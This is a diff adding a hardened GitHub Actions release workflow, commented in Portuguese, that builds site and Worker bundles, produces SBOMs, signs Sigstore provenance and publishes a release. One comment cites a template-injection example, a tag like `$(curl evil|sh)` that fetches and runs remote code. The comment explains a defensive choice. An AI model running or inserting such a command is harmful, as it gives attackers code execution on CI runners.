@@ -1,0 +1,153 @@
+# Release assinada (Sigstore) para o Scorecard reconhecer Signed-Releases —
+# não faz deploy nenhum: o Worker continua manual (npx wrangler deploy à
+# mão, ver dynamic/PLAN.md), este workflow só empacota o que já passou no CI
+# (ci.yml) e assina a proveniência dos tarballs com
+# actions/attest-build-provenance (build_fuzzers/run_fuzzers idem para o
+# alerta de Fuzzing, ver fuzzing.yml). O dono cria a tag manualmente depois
+# de fazer o deploy à mão.
+#
+# Dois jobs, não um: `build` corre `npm ci`/`npx wrangler` (código de
+# terceiros) e só tem contents: read; `release` (assina + publica) é o
+# único com id-token/attestations/contents: write. Uma dependência
+# comprometida em build só teria acesso de leitura, nunca à assinatura nem
+# à Release — os artefactos passam de um job para o outro via
+# actions/upload-artifact / download-artifact, nunca via ficheiros
+# partilhados no mesmo runner.
+name: Release
+
+on:
+  push:
+    tags:
+      - 'v*'
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: 'Tag existente para (re)criar a release (ex.: v2026.08.01) — corre o workflow a partir dessa tag'
+        required: true
+
+permissions: {}
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          # No workflow_dispatch, o ref do trigger nem sempre é a tag em
+          # inputs.tag (o dono pode correr manualmente a partir de main) —
+          # sem isto o conteúdo empacotado não seria o da tag publicada em
+          # tag_name mais abaixo. refs/tags/ explícito (não só o nome nu):
+          # actions/checkout aceita branch/tag/SHA por igual, por isso um
+          # texto trocado no input (nome de branch, SHA) resolvia
+          # silenciosamente para a ref errada em vez de falhar — com o
+          # prefixo, só resolve se for mesmo uma tag existente.
+          ref: ${{ github.event_name == 'workflow_dispatch' && format('refs/tags/{0}', inputs.tag) || github.ref_name }}
+          persist-credentials: false
+
+      # A proveniência do Sigstore (actions/attest-build-provenance, mais
+      # abaixo) descreve o run do workflow em si (github.sha), não o ref
+      # feito checkout acima — normalmente coincidem, mas num
+      # workflow_dispatch corrido a partir de "main" com uma tag diferente
+      # no input, o conteúdo empacotado seria da tag e a proveniência
+      # assinada descreveria main: incoerência sem deteção. Falha cedo se
+      # isso acontecer, em vez de assinar uma proveniência errada.
+      - name: Confirmar tag == ref do run (workflow_dispatch)
+        if: github.event_name == 'workflow_dispatch'
+        # env, nunca ${{ }} direto no script: inputs.tag é texto livre
+        # (workflow_dispatch), e interpolar diretamente no run: é injeção
+        # de template (zizmor apanhou) — uma tag como `$(curl evil|sh)`
+        # corria como shell antes de qualquer validação.
+        env:
+          INPUT_TAG: ${{ inputs.tag }}
+          RUN_SHA: ${{ github.sha }}
+        run: |
+          checked_out="$(git rev-parse HEAD)"
+          if [ "$checked_out" != "$RUN_SHA" ]; then
+            echo "::error::A tag $INPUT_TAG (commit $checked_out) não corresponde ao commit em que este workflow foi corrido ($RUN_SHA). A proveniência Sigstore descreveria o commit errado. Corre de novo escolhendo a própria tag em 'Use workflow from'."
+            exit 1
+          fi
+
+      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
+        with:
+          node-version: '24'
+          # package-manager-cache: false, explícito — zizmor apanhou
+          # (cache-poisoning, severidade alta) que o setup-node cacheia por
+          # omissão (mesmo sem `cache: 'npm'`), e uma cache envenenada é
+          # vetor de execução de código num workflow que publica
+          # artefactos assinados a partir de uma tag. Este workflow corre
+          # raramente (só em tag/manual); a velocidade não compensa o risco.
+          package-manager-cache: false
+
+      # --ignore-scripts: mesma proteção do ci.yml (nenhuma dependência corre
+      # postinstall arbitrário).
+      - name: Build static/
+        working-directory: static
+        run: |
+          npm ci --ignore-scripts
+          npm run build
+          npm test
+          tar -czf ../site-dist.tar.gz dist
+
+      # SBOM (CycloneDX) do que está de facto instalado — mesmo padrão do
+      # supply-chain.yml, não uma ferramenta diferente.
+      - name: SBOM de static/
+        working-directory: static
+        run: npm sbom --sbom-format cyclonedx > sbom-static.cdx.json
+
+      # `wrangler deploy --dry-run --outdir` compila e devolve o bundle sem
+      # publicar (sem segredos, mesmo gate sem-credenciais do ci.yml) — é
+      # este bundle que fica anexado à Release, nunca um deploy real.
+      - name: Empacotar dynamic/worker/ (dry-run, sem deploy)
+        working-directory: dynamic/worker
+        run: |
+          npm ci --ignore-scripts
+          npm test
+          npx wrangler deploy --dry-run --outdir=worker-out
+          tar -czf ../../worker-bundle.tar.gz -C worker-out .
+
+      - name: SBOM de dynamic/worker/
+        working-directory: dynamic/worker
+        run: npm sbom --sbom-format cyclonedx > sbom-worker.cdx.json
+
+      - name: Guardar artefactos para o job de release
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: release-artifacts
+          retention-days: 1
+          path: |
+            site-dist.tar.gz
+            worker-bundle.tar.gz
+            static/sbom-static.cdx.json
+            dynamic/worker/sbom-worker.cdx.json
+
+  release:
+    needs: build
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      id-token: write
+      # obrigatório para assinar a proveniência (Sigstore), mesma razão do
+      # id-token: write no Scorecard.
+      attestations: write
+    steps:
+      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
+        with:
+          name: release-artifacts
+
+      - name: Assinar proveniência (Sigstore)
+        uses: actions/attest-build-provenance@0f67c3f4856b2e3261c31976d6725780e5e4c373 # v4.1.1
+        with:
+          subject-path: '*.tar.gz'
+
+      - name: Criar GitHub Release
+        uses: softprops/action-gh-release@3d0d9888cb7fd7b750713d6e236d1fcb99157228 # v3.0.2
+        with:
+          tag_name: ${{ github.event_name == 'workflow_dispatch' && inputs.tag || github.ref_name }}
+          generate_release_notes: true
+          files: |
+            site-dist.tar.gz
+            worker-bundle.tar.gz
+            static/sbom-static.cdx.json
+            dynamic/worker/sbom-worker.cdx.json
